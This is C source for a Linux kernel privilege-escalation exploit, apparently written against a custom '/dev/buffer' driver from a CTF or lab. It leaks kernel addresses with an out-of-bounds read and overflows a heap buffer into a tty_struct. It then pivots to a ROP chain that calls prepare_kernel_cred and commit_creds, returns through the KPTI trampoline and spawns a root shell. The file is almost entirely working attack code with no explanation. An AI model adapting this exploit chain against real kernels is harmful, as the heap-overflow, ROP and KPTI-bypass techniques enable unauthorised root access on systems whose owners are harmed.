#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/msg.h>
#include <string.h>

#define CMD_NEW 0xeb15
#define CMD_EDIT 0xac1ba
#define CMD_SHOW 0x7aba7a
#define CMD_DEL 0x0da1ba

typedef struct {
	unsigned int index;
	unsigned int size;
	char *data;
} request_t;

struct msgbuf {
	long mtype;
	char mtext[0x3d0];
} msg;

void get_shell(void) {
        char *arg[] = {"/bin/sh", NULL};
        char *env[] = {NULL};

        if(getuid() == 0) {
                printf("got dat root: %d\n", getuid());
                execve(arg[0], arg, env);
        } else {
                printf("aint got that root\n");
        }
}

unsigned long user_rip = (unsigned long)get_shell;
unsigned long user_cs, user_ss, user_rflags, user_sp;

void save_state() {
        __asm__(
                ".intel_syntax noprefix;"
                "mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;"
                ".att_syntax;"
        );
}


int main(int argc, char *argv[]) {
	int spray[100];
	int var;
	char buf[24];

	request_t req, leak_req, write_req;

	int buffd = open("/dev/buffer", O_RDWR);
	if(buffd < 0) {
		fprintf(stderr, "error opening file: %m\n");
		return -1;
	}

	/*for(int i=0;i<100;i++) {
		spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
	}*/

	req.index = 1;
	req.size = 0x3e8;

	if(ioctl(buffd, CMD_NEW, &req)) {
		fprintf(stderr, "CMD_NEW failed: %m\n");
		return -1;
	}

	req.data = malloc(req.size);
	printf("req.data addr: %lx\n", (unsigned long int)req.data);
	strcpy(req.data, "AAAABBBBCCCCDDDD");

	if(ioctl(buffd, CMD_EDIT, &req)) {
		fprintf(stderr, "CMD_EDIT failed: %m\n");
		return -1;
	}

	printf("one buffer allocated\n");
	scanf("%d", &var);
	
	spray[0] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
	printf("tty_struct allocated");
	scanf("%d", &var);
	
	leak_req.index = 1;
	leak_req.size = 0x800;
	leak_req.data = malloc(0x800);

	if(ioctl(buffd, CMD_SHOW, &leak_req)) {
		fprintf(stderr, "CMD_SHOW failed: %m\n");
		return -1;
	}

	long *leak = leak_req.data;
	for(int i=0;i<0x100;i++) {
		printf("leak[%d]: %lx\n", i, leak[i]);
	}

	save_state();
	long heap_addr = leak[135] - ((leak[135] << 0x38) >> 0x38);
	long pop_gadget = leak[201] + 0xff602;
	long push_gadget = leak[201] - 0x1cb7f6;
	long pop_rdi = leak[201] - 0x1dac56;
	long prep_kern = leak[201] - 0x2a8e80;
	long zero_val = 0x0;
	long xchg_rdi_rax = leak[201] + 0x16c5a0;
	long commit_cred = leak[201] - 0x2a9020;
	//long swapgs = leak[201] + 0x31cfbe;
	//long iretq = leak[201] - 0x2f8231;
	long kpti_trampoline = leak[201] + 0x4e5a30 + 0x16;
	long rip_overwrite = (long)&get_shell;

	printf("heap_addr: %lx\n", heap_addr);
	printf("pop_gadget: %lx\n", pop_gadget);
	printf("push_gadget: %lx\n", push_gadget);
	printf("rip overwrite: %lx\n", rip_overwrite);
	scanf("%d", &var);

	//Ok, we need to allocate another buffer here and stick our pop_gadget address in there
	write_req.index = 3;
	write_req.size = 0x3e8;
	write_req.data = malloc(write_req.size);

	for(int i=0;i < 16;i++) {
		memcpy(write_req.data+(i*8), &push_gadget, 8);
	}
	//build our forged stack
	long stack_location = (heap_addr + 0x800) + (18*8);
	printf("stack location: %lx\n", stack_location);

	memcpy(write_req.data+(16*8), &pop_gadget, 8);
	memcpy(write_req.data+(17*8), &stack_location, 8);
	memcpy(write_req.data+(21*8), &pop_rdi, 8);
	memcpy(write_req.data+(22*8), &zero_val, 8);
	memcpy(write_req.data+(23*8), &prep_kern, 8);
	memcpy(write_req.data+(24*8), &xchg_rdi_rax, 8);
	memcpy(write_req.data+(25*8), &commit_cred, 8);
	memcpy(write_req.data+(26*8), &kpti_trampoline, 8);
	memcpy(write_req.data+(27*8), &zero_val, 8);
	memcpy(write_req.data+(28*8), &zero_val, 8);
	memcpy(write_req.data+(29*8), &rip_overwrite, 8);
	memcpy(write_req.data+(30*8), &user_cs, 8);
	memcpy(write_req.data+(31*8), &user_rflags, 8);
	memcpy(write_req.data+(32*8), &user_sp, 8);
	memcpy(write_req.data+(33*8), &user_ss, 8);

	if(ioctl(buffd, CMD_NEW, &write_req)) {
		fprintf(stderr, "CMD_NEW failed: %m\n");
		return -1;
	}
	if(ioctl(buffd, CMD_EDIT, &write_req)) {
		fprintf(stderr, "CMD_EDIT failed: %m\n");
		return -1;
	}

	long scratch_buf = heap_addr + 0x800;
	long scratch_stack = scratch_buf + (16*8)-8; 
	printf("scratch buffer: %lx\n", scratch_buf);
	printf("scratch_stack : %lx\n", scratch_stack);
	
	memset(req.data, 'A', 0x400);
	memcpy(req.data+0x400, &leak[128], 8);
	memcpy(req.data+0x410, &leak[130], 8);
	memcpy(req.data+0x418, &scratch_buf, 8);

	req.size = 0x420;
	if(ioctl(buffd, CMD_EDIT, &req)) {
		fprintf(stderr, "CMD_EDIT failed: %m\n");
		return -1;
	}
	printf("overwrite triggered\n");
	scanf("%d", &var);

	ioctl(spray[0], 0xdeadbeef, scratch_stack);


	return 0;
}
